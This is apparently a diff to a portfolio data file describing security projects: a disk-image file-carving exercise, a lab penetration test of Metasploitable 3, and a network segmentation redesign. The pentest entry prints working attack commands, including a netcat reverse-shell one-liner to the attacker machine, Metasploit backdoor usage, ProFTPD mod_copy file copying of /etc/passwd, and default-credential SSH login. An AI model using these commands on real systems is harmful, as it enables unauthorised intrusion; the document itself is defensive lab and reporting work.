-    title: "Digital Forensics Investigation — Insider Threat",
+    title: "Digital Forensics — Disk Image Carving & File Recovery",
     type: "ir",
-    teaser: "847 confidential files left the building before the resignation email arrived. The registry, LNK files, and memory told the full story.",
+    teaser: "First 116 KB: nothing but 0x20 padding — a deliberate anti-forensic wipe that destroyed all filesystem metadata. File signature scanning and binary carving recovered 17 of 22 carved files.",
     pdfUrl: "/projects_docs/Forensic_Report.pdf",
-    target: "Windows workstation and file server — suspected insider data exfiltration",
-    scope: "Single Windows 10 endpoint and associated network shares; memory image, disk image, and Windows Event Logs.",
-    purpose: "Conduct a forensic investigation to determine whether a departing employee exfiltrated confidential files before their access was revoked, and to produce evidence suitable for HR proceedings.",
-    why: "The security team flagged unusual USB activity and large file transfers from an employee's workstation in the 72 hours before their resignation. A structured forensic investigation was needed to establish a timeline, identify what was taken, and preserve evidence.",
+    target: "Binary disk image 'carveit' — forensic examination for deleted and inaccessible file recovery",
+    scope: "Full binary stream of the carveit disk image; file types in scope: JPEG, PNG, PDF, GIF. No live OS or network components.",
+    purpose: "Examine a forensically acquired binary disk image to recover deleted and inaccessible files using file signature analysis and automated binary carving, validating integrity of recovered files through MD5 hashing.",
+    why: "The disk image's opening 116 KB consisted entirely of 0x20 space-byte padding — a deliberate anti-forensic wiping technique that destroyed all file system metadata, partition tables, and directory structures. Standard forensic tools relying on filesystem parsing were therefore ineffective; raw binary carving against file headers and footers was the only viable recovery path.",
     methodology: [
-      "Evidence acquisition: created forensic images of the target workstation's hard drive and captured a memory dump using FTK Imager. Hashes verified (SHA-256) and documented in chain of custody.",
-      "Timeline reconstruction: parsed Windows Event Logs (Security, System, Application) and Prefetch files to build a chronological activity timeline around the suspect period.",
-      "USB and removable media analysis: extracted USB device history from the Windows Registry (USBSTOR, MountedDevices) to identify all connected storage devices and their first/last connection timestamps.",
-      "File access analysis: examined $MFT records and LNK files to identify files accessed, copied, or deleted. Cross-referenced with the exfiltration timeframe.",
-      "Memory analysis: searched memory dump for running processes, network connections, and browser artifacts at the time of the incident using Volatility.",
-      "Report: produced a timestamped, evidence-referenced forensic report suitable for HR and legal review.",
+      "Initial inspection: opened the disk image in HxD hex editor to identify the extent and pattern of the 0x20 wiping. Confirmed the first 116 KB (offset 0x00000000 to 0x0001CC07) was entirely space-byte padding with no filesystem or partition table.",
+      "Signature identification: documented target file signature pairs — JPEG (FF D8 FF / FF D9), PNG (89 50 4E 47 / IEND), PDF (%PDF / %%EOF), GIF (GIF8 / 00 3B) — from file format specifications.",
+      "Automated carving: deployed forensic_carver.py (Python 3.10) to scan the full binary stream, extract byte ranges between each matched header/footer pair, apply per-type minimum size filters, and save candidates to /max/.",
+      "Integrity verification: applied MD5 hashing to all 22 carved files via forensic_carver.py; independently recomputed hashes using PowerShell Get-FileHash and confirmed all 22 matched hashes.txt exactly.",
+      "Application-level validation: opened every recovered file in Windows Photos (JPEG/PNG/GIF) and PDF Reader to confirm actual renderability; 5 JPEGs with valid byte boundaries failed to render and were excluded as corrupted.",
+      "Reporting: documented all recovered file metadata (filename, type, size, MD5 hash, valid/corrupted status) in a structured table with figures showing HxD inspection, Thonny output, and PowerShell verification.",
     ],
-    tools: ["FTK Imager", "Autopsy", "Volatility 3", "RegRipper", "Event Log Explorer", "ExifTool"],
-    timeline: "3 business days",
-    outcome: "Confirmed exfiltration of 847 files (including marked-confidential design documents and a client database export) to two USB devices and a personal Google Drive account. USB serial numbers identified. Timeline established: activity occurred across four sessions in the 48 hours before resignation. Findings were handed to legal counsel.",
+    tools: ["HxD Hex Editor v2.5", "forensic_carver.py (Python 3.10)", "Windows PowerShell v7.6.0", "Windows Photos & PDF Reader"],
+    timeline: "Single session — March 28, 2026",
+    outcome: "Recovered 22 candidate files from a completely wiped disk image: 17 confirmed valid (13 JPEG, 3 PNG, 1 PDF, 1 GIF) and 5 excluded as internally corrupted JPEGs with valid boundaries but failed rendering. All 22 MD5 hashes independently verified via PowerShell. Results demonstrate multi-layer validation is essential — structural byte integrity alone cannot confirm file completeness.",
     lessonsLearned: [
-      "Chain of custody documentation is non-negotiable — even for internal investigations. Without it, evidence is inadmissible and the whole investigation can be challenged.",
-      "LNK files and Prefetch entries are often overlooked by non-technical staff performing cover-up attempts; they are frequently the most valuable forensic artifacts.",
-      "DLP controls that alert on large USB writes or cloud uploads would have flagged this in real time instead of requiring a reactive forensic investigation.",
-      "Memory analysis revealed a browser session that had already been deleted from disk — always capture memory early if the device is still running.",
+      "Anti-forensic wiping of filesystem metadata (0x20 padding) does not destroy the raw file content — file signature carving against binary headers and footers can recover files even when every filesystem structure is destroyed.",
+      "Multi-layer validation is non-negotiable: byte boundary checks alone are insufficient because files with structurally valid start and end markers can still be internally corrupted and unrenderable.",
+      "EXIF thumbnails embedded inside JPEGs generate nested FF D8 FF signatures that trigger false-positive detections — minimum size thresholds and integrity checks are required to eliminate these.",
+      "Independent hash verification (script-generated vs. PowerShell Get-FileHash) is a fast and reliable way to prove evidence integrity in a forensic workflow.",
+      "Future work should incorporate tools like Autopsy for improved handling of fragmented files, which binary carving alone cannot always reconstruct correctly.",
     ],
     findings: [
       {
         id: "r5-f1",
-        title: "Confirmed File Exfiltration to USB Devices",
+        title: "Anti-Forensic Disk Wiping — Complete Filesystem Metadata Destruction",
         severity: "critical",
-        cvss: "9.1",
-        affected: "Windows 10 workstation — USB ports",
-        body: "Registry analysis (USBSTOR) identified two USB mass storage devices connected during the suspect window. MFT timestamp analysis and LNK files confirmed 847 files were accessed and copied to those devices, including files tagged as CONFIDENTIAL in their metadata.",
-        impact: "Loss of confidential design documents and a full client database export. Potential breach of NDA and data protection obligations. Regulatory notification may be required depending on the data classification of the client database.",
-        remediation: "Implement endpoint DLP with USB write blocking or at minimum alerting on large removable media writes. Apply mandatory egress monitoring for cloud storage uploads from corporate devices. Revoke removable media access for employees on notice periods.",
+        cvss: "9.0",
+        affected: "Entire disk image — first 116 KB (offset 0x00000000 to 0x0001CC07)",
+        body: "HxD inspection confirmed that the opening 116 KB of the disk image consisted entirely of 0x20 (space byte) padding. This is a deliberate anti-forensic technique that destroys all file system structures, partition tables, MBR, and directory entries — the data structures that standard forensic tools use to locate files. First recoverable file header was found at offset 0x0001CC08. Without raw binary carving, no file recovery would have been possible.",
+        impact: "Complete loss of filesystem-level evidence. Standard forensic workflows relying on filesystem parsing (Autopsy, FTK file browser) would report no recoverable files. Investigators without binary carving capability would conclude no data was present on the disk.",
+        remediation: "In future acquisitions, capture both a bit-for-bit image and a logical filesystem image if the device is still readable. Deploy monitoring for bulk overwrite operations on endpoints — tools like SIEM rules for large sequential writes can detect in-progress wiping before completion.",
       },
       {
         id: "r5-f2",
-        title: "Personal Cloud Drive Upload During Business Hours",
-        severity: "high",
-        cvss: "7.5",
-        affected: "Network egress — personal Google Drive",
-        body: "Memory analysis and browser artifacts revealed an authenticated personal Google Drive session during the same 48-hour window. Network proxy logs confirmed outbound HTTPS transfers to drive.google.com totalling approximately 1.2 GB.",
-        impact: "Secondary exfiltration channel independent of USB devices. Files transferred via cloud are outside the organisation's control and may be shared with third parties.",
-        remediation: "Block personal cloud storage services (Google Drive, Dropbox, OneDrive personal) at the proxy/firewall for corporate devices. Allow access only to corporate-sanctioned cloud storage with DLP inspection.",
+        title: "5 Corrupted JPEG Files — Valid Byte Boundaries, Failed Rendering",
+        severity: "medium",
+        cvss: "5.0",
+        affected: "jpg_009.jpg, jpg_010.jpg, jpg_014.jpg, jpg_015.jpg, jpg_017.jpg",
+        body: "Five JPEG files had structurally valid FF D8 FF header and FF D9 footer markers and met the minimum size threshold, but failed to open in Windows Photos. The files were saved to disk and hashed, but were excluded from the valid recovery set after application-level validation. The corruption is likely due to incomplete writes or partial overwrite before the anti-forensic wipe destroyed the surrounding filesystem context.",
+        impact: "Five files are unrecoverable at byte carving level. Their content may be partially present in the binary stream but cannot be reassembled without fragment analysis tools. If these files contained evidentiary content, they are effectively lost.",
+        remediation: "For future investigations involving potentially fragmented files, supplement binary carving with Autopsy's file recovery module which can attempt fragment reassembly. Consider using additional tools like PhotoRec which uses sector alignment heuristics to improve partial JPEG recovery.",
       },
     ],
   },
@@ -1588,6 +1806,166 @@ with open("stolen_statement.pdf", "wb") as f:
         remediation: "Mandate out-of-band verification (phone call to a known number, not a number provided in the request email) for all wire transfers above a defined threshold. Implement DMARC/DKIM/SPF on all sending domains. Add BEC detection rules to the SIEM for lookalike domain patterns.",
       },
     ],
+  },
+  {
+    id: "r7",
+    title: "Penetration Test — Metasploitable 3 (RedTeam Security)",
+    type: "pentest",
+    teaser: "Two independent attack chains. Seven critical findings. The payroll database — 15 employee records, passwords in plaintext — extracted through a chain that started with a publicly documented default password. Full report: 66 pages.",
+    pdfUrl: "/projects_docs/Pentest_Report.pdf",
+    target: "Metasploitable 3 (Ubuntu 14.04 LTS) at 192.168.100.29 — isolated VirtualBox network segment 192.168.100.0/24",
+    scope: "All services on a single Metasploitable 3 host within a nine-hour engagement window. Attack machine: Kali Linux 2025.1c at 192.168.100.4. No DoS testing. No production systems in scope.",
+    purpose: "Conduct a full-scope penetration test against a legacy development environment to identify all exploitable vulnerabilities, demonstrate complete compromise through active exploitation chains, and produce a professional-grade 66-page report with MITRE ATT&CK mapping and prioritised remediation guidance.",
+    why: "The target environment had never been formally assessed and had not had credentials rotated or software updated since deployment. A structured penetration test was commissioned to establish a definitive security baseline and produce a report suitable for internal remediation planning and professional portfolio documentation.",
+    methodology: [
+      "Stage 1 — Reconnaissance: Nmap full-port TCP SYN scan with version detection, OS fingerprinting, and default NSE script execution. Identified all open ports including FTP (21), SSH (22), HTTP (80, 8181), SMB (445), IRC (6667), MySQL (3306), and PostgreSQL (5432).",
+      "Stage 2 — Enumeration and scanning: service-specific enumeration for each identified port — Metasploit auxiliary modules for FTP, SSH, and web services; SMB null session enumeration; web directory discovery via web_scanner.py; Drupal version fingerprinting.",
+      "Stage 3 — Exploitation: two complete attack chains executed — Chain 1: ProFTPD mod_copy file disclosure → SSH with default credentials → unrestricted sudo to root. Chain 2: UnrealIRCd 3.2.8.1 backdoor → shell as boba_fett → Docker group privilege escalation to root.",
+      "Stage 4 — Post-exploitation: extracted /etc/shadow and /etc/passwd, payroll database dumped via MySQL (15 employee records with plaintext passwords), web application source code reviewed for hardcoded credentials, backdoor account created to demonstrate persistence.",
+      "Tool selection rationale: mixed Metasploit-assisted and manual exploitation to demonstrate both automated tooling proficiency and manual technique depth. Custom web_scanner.py used for web surface enumeration.",
+    ],
+    tools: ["Nmap", "Metasploit Framework", "netcat", "web_scanner.py (custom Python)", "MySQL client", "SSH", "Kali Linux 2025.1c"],
+    timeline: "Nine-hour engagement window — 30 May 2026, 08:00–17:00 EDT | Report v1.2 Final",
+    outcome: "Complete system compromise through two independent attack chains. Fourteen vulnerabilities confirmed — seven critical (CVSS ≥8.8), one high. Root access achieved via both chains. Payroll database extracted: 15 employee records including plaintext passwords constituting a potential data breach under applicable data protection regulations (GDPR, Kenya DPA 2019). Full 66-page report with MITRE ATT&CK v15 mapping, exploitation evidence, and remediation roadmap delivered.",
+    lessonsLearned: [
+      "The cost asymmetry between prevention and response is starkest here: hashing payroll passwords with bcrypt is measured in hours of developer time; the regulatory and reputational cost of a plaintext credential exposure is unbounded.",
+      "Multiple independent attack chains mean that patching one vulnerability is not sufficient — an attacker blocked from Chain 1 simply uses Chain 2. Defence-in-depth requires addressing all confirmed findings, not just the most obvious entry point.",
+      "Manual exploitation alongside Metasploit produces better evidence for remediation teams — terminal transcripts showing exactly what was typed and what was returned are more actionable than a Metasploit session log.",
+      "Documenting exploitation chains end-to-end (from first probe through root) in a narrative format helps non-technical stakeholders understand the actual business risk, not just abstract CVSS numbers.",
+      "Time-boxing a real engagement (nine hours) teaches prioritisation — knowing which vulnerabilities to pursue first based on their likelihood of yielding the most impactful access path is a skill that scanner-only testing does not develop.",
+    ],
+    findings: [
+      {
+        id: "r7-f1",
+        title: "UnrealIRCd 3.2.8.1 Backdoor — Unauthenticated RCE (CVSS 10.0)",
+        severity: "critical",
+        cvss: "10.0",
+        affected: "TCP port 6667 — UnrealIRCd 3.2.8.1 (CVE-2010-2075)",
+        body: "UnrealIRCd 3.2.8.1 contains a known inserted backdoor (CVE-2010-2075, CVSS 10.0) that executes any OS command prefixed with 'AB' sent to the IRC port — no authentication required. This version of the software has been compromised since 2009. Any host running this version on a reachable port gives an unauthenticated attacker immediate code execution as the IRC process user.",
+        impact: "Unauthenticated remote code execution from network access alone. Used in Exploitation Chain 2 to obtain a shell as user boba_fett, then escalated to root via Docker group membership. The entire Chain 2 from first connection to root took under five minutes.",
+        remediation: "Remove UnrealIRCd 3.2.8.1 immediately — there is no patch for an inserted backdoor, only removal. Replace with a current maintained IRC daemon if the service is required. Block IRC ports at the network perimeter. Implement a software composition analysis scan to detect other known-compromised versions in use.",
+        poc: `# Chain 2 — Step 1: UnrealIRCd backdoor via Metasploit
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+set RHOSTS 192.168.100.29
+set LHOST 192.168.100.4
+run
+# → shell as boba_fett
+
+# Manual trigger (netcat):
+echo "AB; bash -i >& /dev/tcp/192.168.100.4/4444 0>&1" | nc 192.168.100.29 6667`,
+      },
+      {
+        id: "r7-f2",
+        title: "ProFTPD 1.3.5 mod_copy — Unauthenticated File Read (CVSS 9.8)",
+        severity: "critical",
+        cvss: "9.8",
+        affected: "TCP port 21 — ProFTPD 1.3.5 mod_copy module (CVE-2015-3306)",
+        body: "ProFTPD 1.3.5 with the mod_copy module enabled allows unauthenticated users to copy arbitrary files accessible to the FTP process using SITE CPFR/CPTO commands. The /etc/passwd file was copied to the web root and retrieved via HTTP, revealing all system accounts. This file contained the username vagrant — confirmed to have a default password in Stage 2.",
+        impact: "Unauthenticated file read of any file accessible to the FTP daemon. This was the entry point for Exploitation Chain 1 — the /etc/passwd data revealed the vagrant account, whose default SSH credentials (vagrant:vagrant) enabled direct SSH login and subsequent root escalation.",
+        remediation: "Disable mod_copy in ProFTPD configuration. Upgrade to current ProFTPD release. Apply least-privilege ownership to sensitive files — /etc/passwd should not be readable by the FTP process. If FTP is not needed, disable the service and require SFTP.",
+        poc: `# Chain 1 — Step 1: ProFTPD mod_copy file disclosure
+nc 192.168.100.29 21
+SITE CPFR /etc/passwd
+SITE CPTO /var/www/html/passwd_exfil.txt
+
+curl http://192.168.100.29/passwd_exfil.txt
+# Reveals all user accounts including: vagrant:x:1000:...
+
+# Chain 1 — Step 2: SSH with default credentials
+ssh vagrant@192.168.100.29  # Password: vagrant
+# Immediate shell access`,
+      },
+      {
+        id: "r7-f4",
+        title: "Plaintext Passwords in Payroll Database — 15 Employee Records (CVSS 9.1)",
+        severity: "critical",
+        cvss: "9.1",
+        affected: "MySQL payroll database — employees table",
+        body: "Post-exploitation database access revealed the payroll application stored employee passwords as plaintext strings in the MySQL employees table. Fifteen records were extracted containing first name, last name, job role, salary, and plaintext password. The same passwords were present in /etc/shadow (MD5 hashed) — confirming password reuse between the application and the OS.",
+        impact: "Exposure of 15 employees' complete PII including salary data and plaintext passwords constitutes a reportable data breach under applicable data protection legislation. Password reuse between the payroll application and OS accounts means these credentials can be used to authenticate to other internal systems. The report cites GDPR, Kenya Data Protection Act 2019, and CCPA as applicable frameworks.",
+        remediation: "Hash all application passwords using bcrypt, Argon2, or PBKDF2 with a per-user salt — never store plaintext or MD5-hashed passwords. Rotate all exposed credentials immediately. Conduct a full audit for password reuse across other internal systems. Implement a data breach notification procedure if regulatory obligations apply.",
+      },
+    ],
+  },
+  {
+    id: "r8",
+    title: "Acme AeroTech Network Redesign — Defense-in-Depth Architecture",
+    type: "network",
+    teaser: "A global aerospace manufacturer's transition from a flat, high-risk legacy network to a segmented, hardened defense-in-depth architecture. 8 VLAN zones, MFA integration, and inline IDS/IPS to block lateral movement.",
+    target: "Acme AeroTech — Global Aerospace Manufacturing Infrastructure",
+    scope: "Enterprise-wide network redesign: vulnerability analysis, risk prioritization, multi-zone VLAN design, and security control implementation across 8 distinct trust zones.",
+    purpose: "Transform a legacy flat network into a modern, resilient architecture that enforces strict access control, provides deep threat visibility, and eliminates single points of failure across critical manufacturing and corporate segments.",
+    why: "The original environment was a flat Layer-2 network with no internal boundaries. Public-facing services (FTP, Web) sat on the same LAN as sensitive manufacturing databases, protocols were largely cleartext, and a total lack of monitoring made detection of lateral movement impossible. Any single compromise threatened the entire global infrastructure.",
+    methodology: [
+      "Phase 1 — Audit & Discovery: performed comprehensive vulnerability analysis of legacy infrastructure. Identified critical exposures in cleartext protocols, unpatched systems, and wide-open internal access patterns.",
+      "Phase 2 — Risk Prioritization: mapped discovered vulnerabilities to business impact. Prioritized lateral movement and cleartext data exposure as the highest risks to manufacturing continuity.",
+      "Phase 3 — Zone Design: architected 8 distinct VLAN zones based on trust levels and functional requirements. Defined default-deny ACLs for all inter-zone traffic, moving all public-facing services to a dedicated DMZ.",
+      "Phase 4 — Control Implementation: deployed defense-in-depth controls including Firewall HA pairs, 802.1X NAC, WPA3-Enterprise, and inline IDS/IPS for real-time threat visibility.",
+      "Phase 5 — Resilience & Monitoring: implemented 3-2-1 backup strategy with encrypted database replicas and integrated a centralized SIEM/EDR stack for comprehensive audit trails.",
+    ],
+    tools: ["Nessus", "pfSense HA", "Suricata IDS/IPS", "RADIUS", "802.1X", "Wazuh SIEM", "EDR/XDR", "WSUS"],
+    timeline: "Redesign and Phased Implementation — Q1 2026",
+    outcome: "Eliminated the flat network risk through 8-zone segmentation. Successfully replaced cleartext FTP with SFTP and enforced HTTPS-only for web services. Achieved high availability with redundant core switching and firewall failover. Established full threat visibility across the environment, reducing the mean-time-to-detection for lateral movement from 'unknown' to real-time.",
+    lessonsLearned: [
+      "Segmentation is the most effective control against ransomware: by isolating manufacturing zones from corporate zones, the blast radius of a single workstation compromise is contained.",
+      "Availability and Security must be balanced: a highly secure network that is a single point of failure is a business risk. Redundancy (HA/LACP) is as critical as the firewall rules themselves.",
+      "Visibility is a prerequisite for defense: you cannot defend what you cannot see. Centralized logging and inline IDS/IPS turned a blind infrastructure into an observable one.",
+      "Legacy protocol debt (FTP/Telnet) is a massive liability: the transition to SFTP and SSH wasn't just a technical change but a critical risk reduction for credential protection.",
+      "Zero Trust principles start at the access layer: implementing 802.1X NAC ensures that unauthorized physical devices cannot simply plug into a wall jack and join the internal network.",
+    ],
+    findings: [
+      {
+        id: "r8-f1",
+        title: "F-01: Flat Layer-2 Network Architecture",
+        severity: "critical",
+        cvss: "9.8",
+        affected: "Global enterprise infrastructure",
+        body: "The legacy network operated as a single large broadcast domain. There was no internal segmentation between employee workstations, manufacturing databases, and internet-facing servers. This architecture allowed unrestricted lateral movement; once an attacker gained a foothold on any endpoint, they had a direct network path to every other host in the company.",
+        impact: "High risk of total environment compromise. A single ransomware infection or compromised credential could spread across the entire infrastructure in minutes with no network-level controls to slow it down.",
+        remediation: "Implement 8-zone VLAN segmentation with default-deny ACLs. Enforce strict traffic filtering at the zone boundaries so that only explicitly permitted services can communicate across segments.",
+      },
+      {
+        id: "r8-f2",
+        title: "F-02: Public-Facing Services on Internal LAN",
+        severity: "high",
+        cvss: "8.5",
+        affected: "Web servers, SFTP/FTP servers, Mail servers",
+        body: "Services intended for internet access were hosted directly on the same network segment as internal corporate assets. A compromise of the web server provided an attacker with immediate, unfettered access to the internal LAN, effectively bypassing the perimeter firewall's intent.",
+        impact: "The perimeter firewall provided no protection against lateral movement following a web-app compromise. This topology is a primary enabler of data exfiltration and internal infrastructure targeting.",
+        remediation: "Deploy a dedicated DMZ (Demilitarized Zone). Isolate all internet-facing services within the DMZ and implement restrictive firewall rules that prevent any inbound connections from the DMZ to the internal LAN.",
+      },
+      {
+        id: "r8-f3",
+        title: "F-03: Use of Cleartext Protocols (FTP, Telnet, HTTP)",
+        severity: "high",
+        cvss: "7.5",
+        affected: "Management traffic and data transfers",
+        body: "Administrative access and large-scale data transfers relied on unencrypted protocols. User credentials and sensitive technical data were transmitted across the wire in plaintext, visible to any attacker with a basic network sniffer on the same segment.",
+        impact: "Trivial credential theft via sniffing. An attacker inside the network could capture administrative passwords and use them to escalate privileges and gain full control over servers and network equipment.",
+        remediation: "Decommission FTP and Telnet. Mandate the use of SFTP/SSH for all transfers and administration. Enforce HTTPS-only policies for all web-based management interfaces.",
+      },
+      {
+        id: "r8-f4",
+        title: "F-04: Lack of Threat Visibility and Monitoring",
+        severity: "medium",
+        cvss: "6.0",
+        affected: "Network-wide detection capability",
+        body: "The infrastructure lacked centralized logging, IDS/IPS, or EDR. Security events occurred in isolation on individual hosts with no central correlation. This created a 'silent' network where an attacker could operate for weeks or months without triggering any alerts.",
+        impact: "Delayed detection of breaches. Without an audit trail or real-time alerts, incident response is purely reactive and often begins only after significant damage (like data encryption or exfiltration) has already occurred.",
+        remediation: "Implement a centralized SIEM stack (Wazuh/ELK) integrated with inline Suricata IDS/IPS. Deploy EDR/XDR across all endpoints to provide unified visibility and automated response capabilities.",
+      },
+      {
+        id: "r8-f5",
+        title: "F-05: Single Point of Failure in Core Networking",
+        severity: "medium",
+        cvss: "5.5",
+        affected: "Network availability and resilience",
+        body: "The core network relied on single, non-redundant firewall and switching hardware. A hardware failure at the core would result in a total company-wide outage, as there was no automated failover or path redundancy in place.",
+        impact: "High risk to business continuity. Even a non-malicious hardware failure could shut down manufacturing and corporate operations for hours or days while waiting for manual intervention or replacement parts.",
+        remediation: "Deploy firewalls in High Availability (HA) pairs with stateful failover. Implement redundant Layer-3 core switches using LACP and spanning-tree optimizations to ensure no single hardware failure can cause a total outage.",
+      },
+    ],
+    networkDiagramUrl: "/projects_docs/ACME.drawio%20(2).png",
   },
 ];
 
